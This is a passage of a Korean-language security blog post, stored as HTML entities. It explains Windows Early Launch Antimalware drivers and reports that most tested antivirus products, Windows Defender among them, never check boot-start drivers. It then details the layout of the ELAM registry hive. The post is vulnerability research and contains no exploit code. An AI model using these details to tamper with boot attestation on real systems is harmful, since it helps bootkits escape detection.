&#xC800;&#xC7A5;&#xD574;&#xC57C; &#xD568;</li><li>ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC11C;&#xBA85;&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC0AC;&#xD574;&#xC57C; &#xD568;.</li><li>ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC798;&#xBABB;&#xB41C; &#xC11C;&#xBA85;&#xC744; &#xCC98;&#xB9AC;&#xD574;&#xC57C; &#xD568; (&#xC774; &#xACBD;&#xC6B0; &#xBAA8;&#xB4E0; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; unknown&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD574;&#xC57C; &#xD568;).</li><li>ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC545;&#xC131; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84; (&#xB610;&#xB294; &#xB2E4;&#xB978; &#xC815;&#xCC45; &#xC704;&#xBC18;)&#xAC00; &#xC2DD;&#xBCC4;&#xB418;&#xBA74; &#xCE21;&#xC815;&#xB41C; &#xBD80;&#xD305; &#xC0C1;&#xD0DC;&#xB97C; &#xBB34;&#xD6A8;&#xD654;&#xD574;&#xC57C; &#xD568;</li></ul><p>ELAM &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xAC00; &#xCC98;&#xC74C; &#xB4F1;&#xC7A5;&#xD588;&#xC744; &#xB54C;&#xB294; <a href="https://www.welivesecurity.com/2012/12/27/win32gapz-new-bootkit-technique/">&#xD6A8;&#xC6A9;&#xC131;&#xC5D0; &#xC758;&#xBB38;&#xC774; &#xC81C;&#xAE30;&#xB418;&#xC5C8;&#xB2E4;</a>. bootkit&#xC740; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; VBR(Volume Boot Recod)&#xC5D0; &#xAE30;&#xB85D;&#xD558;&#xAC70;&#xB098; IPL(Initial Program Loader)&#xB85C; &#xB300;&#xCCB4;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xB458; &#xB2E4; Windows Kernel &#xC774;&#xC804;&#xC5D0; &#xC2E4;&#xD589;&#xB418;&#xBBC0;&#xB85C; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; Verified/Measured &#xBD80;&#xD305;&#xC758; &#xB4F1;&#xC7A5;&#xC73C;&#xB85C; &#xC704; &#xAE30;&#xBC95;&#xC758; &#xC801;&#xC6A9;&#xC774; &#xC5B4;&#xB824;&#xC6CC;&#xC838; ELAM &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xAC00; &#xC81C; &#xAE30;&#xB2A5;&#xC744; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xB2E4;.</p><h1 id="ELAM-and-Measured-Signatures"><a href="#ELAM-and-Measured-Signatures" class="headerlink" title="ELAM and Measured Signatures"></a>ELAM and Measured Signatures</h1><p>Measured &#xBD80;&#xD305; &#xC911; ELAM &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB97C; &#xC77D;&#xC740; &#xB2E4;&#xC74C; Windows Loader&#xC5D0;&#xC11C; &#xCE21;&#xC815;&#xD55C;&#xB2E4;(<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/elam-driver-requirements#malware-signatures">&#xCD9C;&#xCC98;</a>). &#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; ELAM &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xAC00; &#xC2E0;&#xB8B0; &#xCCB4;&#xC778;&#xC5D0; &#xBC30;&#xCE58;&#xB418;&#xC5B4; &#xC99D;&#xBA85; &#xC911;&#xC5D0; &#xB204;&#xB77D; &#xD639;&#xC740; &#xB2E4;&#xC6B4;&#xADF8;&#xB808;&#xC774;&#xB4DC; &#xB41C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB97C; &#xAC10;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>ELAM &#xD558;&#xC774;&#xBE0C; &#xB0B4;&#xC758; &#xD2B9;&#xC815; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAC12;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC704;&#xCE58;&#xB9CC; &#xCE21;&#xC815;&#xB418;&#xBA70; &#xC774; &#xAC12;&#xC744; <code>Measured</code>, <code>Policy</code> &#xBC0F; <code>Config</code>&#xB77C;&#xACE0; &#xD55C;&#xB2E4;. &#xC5EC;&#xAE30;&#xC5D0;&#xB294; &#xACF5;&#xAE09; &#xC5C5;&#xCCB4;&#xBCC4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD3EC;&#xD568;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC774;&#xB984;&#xC774; &#xB2E4;&#xB974;&#xAC70;&#xB098; &#xC720;&#xD615;&#xC774; <code>REG_BINARY</code>&#xAC00; &#xC544;&#xB2CC; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAC12;&#xC740; &#xCE21;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%201.png" alt="measured-boot-vuln/Untitled%201.png"></p><blockquote><p>Table 2. Trend Micro &#xBC0F; Microsoft&#xC5D0;&#xC11C; &#xAC01;&#xAC01; &#xC800;&#xC7A5;&#xD55C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98; &#xB370;&#xC774;&#xD130;&#xC640; &#xCE21;&#xC815;&#xAC12;(&#xAD75;&#xAC8C; &#xD45C;&#xC2DC;&#xB428;)</p></blockquote><p>ELAM &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB294; Windows Loader&#xC5D0; &#xC758;&#xD574; &#xCE21;&#xC815;&#xB418;&#xC9C0;&#xB9CC; ELAM &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB294; Windows Kernel&#xC5D0; &#xC758;&#xD574; &#xC81C;&#xACF5;&#xB41C;&#xB2E4;&#xB294; &#xC810;&#xC774; &#xC911;&#xC694;&#xD558;&#xB2E4;.</p><h1 id="Real-World-ELAM-Drivers"><a href="#Real-World-ELAM-Drivers" class="headerlink" title="Real-World ELAM Drivers"></a>Real-World ELAM Drivers</h1><p>2021 &#xB144; 2&#xC6D4;&#xC5D0; &#xD544;&#xC790;&#xB294; &#xC720;&#xBA85;&#xD55C; &#xC548;&#xD2F0; &#xBA40;&#xC6E8;&#xC5B4; &#xC81C;&#xD488;&#xC758; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xB9AC;&#xBC84;&#xC2F1;&#xD588;&#xB2E4;. 25&#xAC1C;&#xC758; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC788;&#xB294; &#xCD1D; 26 &#xAC1C;&#xC758; &#xC81C;&#xD488; (2 &#xAC1C;&#xC758; &#xC81C;&#xD488;&#xC774; &#xB3D9;&#xC77C;&#xD55C; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xACF5;&#xC720;)&#xC5D0;&#xC11C; 24 &#xAC1C;&#xAC00; &#xAE30;&#xBCF8; &#xAD6C;&#xC131;&#xC73C;&#xB85C; &#xC124;&#xCE58;&#xB418;&#xC5B4; &#xC788;&#xC5C8;&#xB2E4;. </p><p>&#xD765;&#xBBF8;&#xB86D;&#xAC8C;&#xB3C4; &#xBAA8;&#xB4E0; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xB294; &#xBCF4;&#xD638;&#xB41C; &#xC548;&#xD2F0; &#xBA40;&#xC6E8;&#xC5B4; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xB370; &#xD544;&#xC694;&#xD55C; &#xC778;&#xC99D;&#xC11C; &#xC815;&#xBCF4;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC9C0;&#xB9CC; 26&#xAC1C; &#xC911; 15&#xAC1C; &#xC81C;&#xD488;&#xC5D0;&#xC11C; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xB300;&#xD574; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xD558;&#xB4DC;&#xCF54;&#xB529;&#xB41C; &#xACB0;&#xACFC;&#xAC12;&#xC744; &#xBC18;&#xD658;&#xD558;&#xAC70;&#xB098; &#xACB0;&#xACFC;&#xAC12;&#xC744; &#xC804;&#xD600; &#xC81C;&#xACF5;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;. </p><blockquote><p>&#xC774;&#xB7EC;&#xD55C; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; placeholder driver&#xB77C;&#xACE0; &#xD55C;&#xB2E4;.</p></blockquote><p>&#xB450; &#xAC1C;&#xC758; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xB7F0;&#xD0C0;&#xC784; &#xC548;&#xD2F0; &#xBA40;&#xC6E8;&#xC5B4; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC5D0; &#xB300;&#xD55C; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC815;&#xBCF4;&#xB97C; &#xAE30;&#xB85D;&#xD588;&#xC9C0;&#xB9CC; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C;&#xB294; &#xC2E4;&#xC81C; &#xAC80;&#xC0AC;&#xAC00; &#xC218;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBA70; &#xACB0;&#xACFC;&#xAC12;&#xC740; &#xD56D;&#xC0C1; <code>unknown</code>&#xC774;&#xC5C8;&#xACE0;, &#xD55C; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xBAA8;&#xB4E0; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#xACB0;&#xACFC;&#xAC12;&#xC744; <code>good</code>&#xC73C;&#xB85C; &#xBCF4;&#xACE0;&#xD588;&#xB2E4;.</p><p>11&#xAC1C;&#xC758; &#xC81C;&#xD488;&#xC758; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xB300;&#xD574; &#xBA87; &#xAC00;&#xC9C0; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD588;&#xB2E4;. &#xADF8;&#xC911; &#xD558;&#xB098;&#xB294; &#xC54C;&#xB824;&#xC9C4; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xC778;&#xC99D;&#xC11C;&#xC758; &#xD558;&#xB4DC;&#xCF54;&#xB529;&#xB41C; &#xBAA9;&#xB85D;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xACE0; ELAM &#xD558;&#xC774;&#xBE0C;&#xB294; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBA70; 2&#xAC1C;&#xB294; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98; &#xB370;&#xC774;&#xD130;&#xC5D0; ELAM &#xD558;&#xC774;&#xBE0C;&#xC640; SYSTEM &#xD558;&#xC774;&#xBE0C;&#xB97C; &#xBAA8;&#xB450; &#xC0AC;&#xC6A9;&#xD588;&#xB2E4;. &#xD558;&#xB098;&#xB294; ELAM &#xD558;&#xC774;&#xBE0C;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; &#xB4A4; SYSTEM &#xD558;&#xC774;&#xBE0C;&#xB97C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98; &#xB370;&#xC774;&#xD130; &#xB300;&#xCCB4;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; 7&#xAC1C;&#xC758; &#xC81C;&#xD488;&#xC740; ELAM &#xD558;&#xC774;&#xBE0C;&#xC5D0;&#xC11C;&#xB9CC; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5C8;&#xB2E4;.</p><p>11 &#xAC1C;&#xC758; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC911; &#xB2E8; 2&#xAC1C;&#xB9CC; &#xACB0;&#xACFC;&#xAC12;&#xC5D0; &#xB530;&#xB77C; &#xC99D;&#xBA85;&#xC744; &#xCDE8;&#xC18C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC73C;&#xBA70; &#xB2E4;&#xB978; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xD574;&#xB2F9; &#xB8E8;&#xD2F4;&#xC744; &#xD638;&#xCD9C;&#xC870;&#xCC28; &#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;.</p><p>&#xC774;&#xC81C; &#xC81C;&#xD488;&#xC758; &#xC774;&#xB984;&#xC744; &#xC5B8;&#xAE09;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xB2E4;.</p><p>&#xB180;&#xB78D;&#xAC8C;&#xB3C4; Windows Defender&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xB418;&#xB294; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC5B8;&#xAE09;&#xB41C; &#xBAA8;&#xB4E0; &#xADDC;&#xCE59;&#xC744; &#xB530;&#xB974;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBA70; SYSTEM &#xD558;&#xC774;&#xBE0C;&#xB97C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98; &#xB370;&#xC774;&#xD130;&#xC758; &#xC800;&#xC7A5; &#xC704;&#xCE58;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; (&#xAE30;&#xBCF8; &#xC704;&#xCE58; &#xC778; ELAM &#xD558;&#xC774;&#xBE0C; &#xC81C;&#xC678;) &#xC545;&#xC131; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xAC10;&#xC9C0;&#xB418;&#xC5C8;&#xC744; &#xB54C; &#xC99D;&#xBA85;&#xC744; &#xCDE8;&#xC18C;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;.</p><p>Kaspersky &#xBC0F; ZoneAlarm &#xC81C;&#xD488;&#xC758; &#xB3D9;&#xC77C;&#xD55C; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; ELAM &#xD558;&#xC774;&#xBE0C;&#xC640; SYSTEM &#xD558;&#xC774;&#xBE0C; &#xB450; &#xC704;&#xCE58;&#xC5D0;&#xC11C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5C8;&#xC73C;&#xBA70; &#xC99D;&#xBA85; &#xB610;&#xD55C; &#xCDE8;&#xC18C;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;.</p><p>Sophos &#xC81C;&#xD488;&#xC758; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xBAA8;&#xB4E0; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; <code>good</code>&#xC73C;&#xB85C; &#xD45C;&#xC2DC;&#xD55C;&#xB2E4;. &#xC774;&#xB294; Sophos&#xC5D0; &#xBCF4;&#xC548; &#xC774;&#xC288;&#xB85C; &#xBCF4;&#xACE0;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xBCF4;&#xC548; &#xC0C1;&#xC758; &#xACB0;&#xD568;&#xC774; &#xC5C6;&#xB294; &#xC758;&#xB3C4;&#xB41C; &#xAE30;&#xB2A5;&#xC73C;&#xB85C; &#xAC04;&#xC8FC;&#xB418;&#xC5C8;&#xB2E4;.</p><p>&#xC694;&#xC57D;&#xD558;&#xC790;&#xBA74;, &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC548;&#xD2F0; &#xBA40;&#xC6E8;&#xC5B4; &#xC81C;&#xD488;&#xC740; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC545;&#xC131; boot-start &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xAC80;&#xC0C9;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;. &#xB300;&#xC2E0; ELAM &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC790;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xBCF4;&#xD638;&#xB41C; &#xC11C;&#xBE44;&#xC2A4;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xACE0; &#xD575;&#xC2EC; ELAM &#xAE30;&#xB2A5;&#xC740; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xB2E8;&#xC77C; &#xACB0;&#xACFC;&#xAC12;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xAC70;&#xB098; &#xACB0;&#xACFC;&#xAC12;&#xC744; &#xC804;&#xD600; &#xC81C;&#xACF5;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xB2E4;.</p><h1 id="ELAM-Hive"><a href="#ELAM-Hive" class="headerlink" title="ELAM Hive"></a>ELAM Hive</h1><p>ELAM &#xD558;&#xC774;&#xBE0C;&#xB294; <code>C:\Windows\System32\config\ELAM</code> &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;&#xB41C;&#xB2E4;.</p><p><a href="https://github.com/msuhanov/regf/blob/master/Windows%20registry%20file%20format%20specification.md">&#xC774;&#xC804; &#xAE00;&#xC5D0;</a> &#xD574;&#xB2F9; &#xD3EC;&#xB9F7;&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xBA85;&#xC774; &#xC788;&#xC73C;&#xBA70; &#xCDE8;&#xC57D;&#xC131;&#xC744; &#xC774;&#xD574;&#xD558;&#xB294; &#xB370; &#xD544;&#xC694;&#xD55C; &#xBA87; &#xAC00;&#xC9C0; &#xD575;&#xC2EC; &#xC0AC;&#xD56D;&#xC774; &#xC788;&#xB2E4;.</p><ul><li>&#xD0A4; &#xB178;&#xB4DC;&#xB294; &#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;&#xC744; &#xAC00;&#xB9AC;&#xD0AC; &#xC218; &#xC788;&#xB2E4;.<ul><li>&#xD0A4; &#xB178;&#xB4DC; : &#xB2E8;&#xC77C; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xB97C; &#xC124;&#xBA85;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xAD6C;&#xC870;</li><li>&#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D; : &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xC758; &#xD558;&#xC704; &#xD0A4;&#xB97C; &#xC124;&#xBA85;&#xD558;&#xB294; &#xD0A4; &#xB178;&#xB4DC;&#xC5D0; &#xB300;&#xD55C; &#xC624;&#xD504;&#xC14B; &#xBAA9;&#xB85D;</li></ul></li><li>&#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xD0A4; &#xB178;&#xB4DC;&#xB294; &#xAC12; &#xBAA9;&#xB85D;&#xC744; &#xAC00;&#xB9AC;&#xD0AC; &#xC218; &#xC788;&#xB2E4;.<ul><li>&#xAC12; &#xBAA9;&#xB85D;: &#xD0A4; &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xC624;&#xD504;&#xC14B; &#xBAA9;&#xB85D;, &#xAC01; &#xD0A4; &#xAC12;&#xC740; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xC5D0; &#xC18D;&#xD558;&#xB294; &#xB2E8;&#xC77C; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAC12;&#xC744; &#xC124;&#xBA85;&#xD568;</li></ul></li><li><code>0xFFFFFFFF</code>&#xC640; &#xAC19;&#xC740; &#xC624;&#xD504;&#xC14B;&#xC740; &#x201C;nil&#x201D;&#xC744; &#xD45C;&#xD604;&#xD55C;&#xB2E4;.</li><li>&#xC774;&#xB7EC;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC740; &#xC808;&#xB313;&#xAC12;&#xC774; &#xC544;&#xB2C8;&#xBA70; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD30C;&#xC77C;&#xC758; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC5BB;&#xC73C;&#xB824;&#xBA74; 4096 bytes&#xB97C; &#xCD94;&#xAC00;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</li><li>&#xD0A4; &#xB178;&#xB4DC;&#xC640; &#xD0A4; &#xAC12;&#xC740; &#xAC01;&#xAC01; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xC758; &#xC774;&#xB984;&#xACFC; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAC12;&#xC758; &#xC774;&#xB984;&#xC744; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;. &#xC774;&#xB294; &#xD655;&#xC7A5; ASCII (Latin-1) &#xBB38;&#xC790;&#xC5F4; &#xD639;&#xC740; UTF-16LE &#xBB38;&#xC790;&#xC5F4;&#xC774;&#xB2E4;. (&#xD655;&#xC7A5; ASCII &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xC800;&#xC7A5;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xD574;&#xB2F9; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC555;&#xCD95;&#xB428;.)</li><li>&#xD558;&#xC704; &#xD0A4;&#xC5D0;&#xC11C; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xAD6C;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xAC80;&#xC0C9;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB824;&#xBA74; &#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;&#xC744; &#xB300;&#xBB38;&#xC790; &#xC774;&#xB984;(&#xC0AC;&#xC804; &#xC21C; &#xC815;&#xB82C;)&#xC73C;&#xB85C; &#xC815;&#xB82C;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.<ul><li>&#xAC12; &#xBAA9;&#xB85D;&#xC740; &#xC815;&#xB82C;&#xD560; &#xD544;&#xC694; &#xC5C6;&#xC74C;</li></ul></li><li>&#xD0A4; &#xAC12;&#xC740; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAC12;&#xC758; &#xB370;&#xC774;&#xD130; &#xC720;&#xD615;(&#xC608; : REG_BINARY)&#xC744; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xAC12; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAC00;&#xB9AC;&#xD0A8;&#xB2E4;.</li><li>4 bytes &#xC774;&#xD558;&#xC758; &#xAC12; &#xB370;&#xC774;&#xD130;&#xB294; &#xD0A4; &#xAC12;&#xC5D0; &#xC9C1;&#xC811; &#xC800;&#xC7A5;&#xB41C;&#xB2E4;.</li><li>4 bytes &#xBCF4;&#xB2E4; &#xD070; &#xAC12; &#xB370;&#xC774;&#xD130;&#xB294; &#xB2E4;&#xB978; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xBA70; &#xC774; &#xC624;&#xD504;&#xC14B;&#xC740; &#xD0A4; &#xAC12;&#xC5D0; &#xAE30;&#xB85D;&#xB41C;&#xB2E4;.</li><li>16344 bytes&#xBCF4;&#xB2E4; &#xD070; &#xAC12; &#xB370;&#xC774;&#xD130;&#xB294; 16344 btyes &#xC774;&#xD558;&#xC758; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xACE0; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC5D0; &#xB300;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC740; &#xBAA9;&#xB85D;&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xB41C;&#xB2E4;. &#xD0A4; &#xAC12;&#xC5D0;&#xB294; &#xB370;&#xC774;&#xD130; &#xB300;&#xC2E0; &#xBAA9;&#xB85D;&#xC5D0; &#xB300;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC774; &#xC800;&#xC7A5;&#xB41C; Big Data Record&#xC758; &#xC624;&#xD504;&#xC14B;&#xC774; &#xC800;&#xC7A5;&#xB41C;&#xB2E4;.</li></ul><p>&#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD30C;&#xC77C;&#xC758; &#xC608;&#xC81C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%202.png" alt="measured-boot-vuln/Untitled%202.png"></p><blockquote><p>Figure 1<br>&#xC120;&#xD0DD;&#xB41C; &#xC601;&#xC5ED; - ELAM &#xD558;&#xC774;&#xBE0C;&#xC758; root key &#xB178;&#xB4DC;<br>&#xB179;&#xC0C9; - &#xD558;&#xC704; &#xD0A4;&#xC758; &#xAC1C;&#xC218;(2&#xAC1C;)<br>&#xBE68;&#xAC04;&#xC0C9; - &#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;&#xC5D0; &#xB300;&#xD55C; &#xC624;&#xD504;&#xC14B; (0x3328, &#xC808;&#xB300; &#xC624;&#xD504;&#xC14B;: 0x3328+4096=0x4328)<br>&#xB178;&#xB780;&#xC0C9; - &#xD0A4; &#xC774;&#xB984; (&#x201C;ROOT&#x201D;, ASCII &#xBB38;&#xC790;&#xC5F4;)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%203.png" alt="measured-boot-vuln/Untitled%203.png"></p><blockquote><p>Figure 2<br>&#xC120;&#xD0DD;&#xB41C; &#xC601;&#xC5ED; - &#xB8E8;&#xD2B8; &#xD0A4;&#xC5D0; &#xB300;&#xD55C; &#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;<br>&#xB178;&#xB780;&#xC0C9; - &#xBAA9;&#xB85D;&#xC758; &#xC694;&#xC18C; &#xC218; (2&#xAC1C;)<br>&#xBE68;&#xAC04;&#xC0C9; - &#xB450; &#xAC1C;&#xC758; &#xD558;&#xC704; &#xD0A4;&#xC5D0; &#xB300;&#xD55C; &#xC624;&#xD504;&#xC14B; (0x3188 &#xBC0F; 0x0120, &#xC774; &#xC720;&#xD615;&#xC758; &#xD558;&#xC704; &#xD0A4; &#xBAA9;&#xB85D;&#xC5D0;&#xC11C;&#xB294; 4 &#xAC1C;)</p></blockquote><p>&#xAC01; &#xC624;&#xD504;&#xC14B; &#xB4A4;&#xC5D0;&#xB294; &#xC774;&#xB984; &#xD574;&#xC2DC;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xC0AC;&#xC804; &#xC21C; &#xC815;&#xB82C;&#xB85C; &#xC800;&#xC7A5;&#xB41C;&#xB2E4;. (<code>0x3188</code>&#xC740; &#x201C;Trend Micro&#x201D; &#xD0A4; &#xB178;&#xB4DC;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xACE0; <code>0x0120</code>&#xC740; &#x201C;Windows Defender&#x201D; &#xD0A4; &#xB178;&#xB4DC;&#xC5D0; &#xD574;&#xB2F9;&#xB428;)</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%204.png" alt="measured-boot-vuln/Untitled%204.png"></p><blockquote><p>Figure 3<br>&#xC120;&#xD0DD;&#xB41C; &#xC601;&#xC5ED; - &#x201C;Windows Defender&#x201D; &#xD0A4; &#xB178;&#xB4DC;<br>&#xBE68;&#xAC04;&#xC0C9; - &#xAC12; &#xB370;&#xC774;&#xD130;(1)<br>&#xB178;&#xB780;&#xC0C9; - &#xBAA9;&#xB85D;&#xC5D0; &#xB300;&#xD55C; &#xC624;&#xD504;&#xC14B; (0x3180)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%205.png" alt="measured-boot-vuln/Untitled%205.png"></p><blockquote><p>Figure 4<br>&#xC120;&#xD0DD;&#xB41C; &#xC601;&#xC5ED; - &#xAC12; &#xBAA9;&#xB85D;(&#xC720;&#xD6A8;&#xD55C; &#xD56D;&#xBAA9;&#xC740; 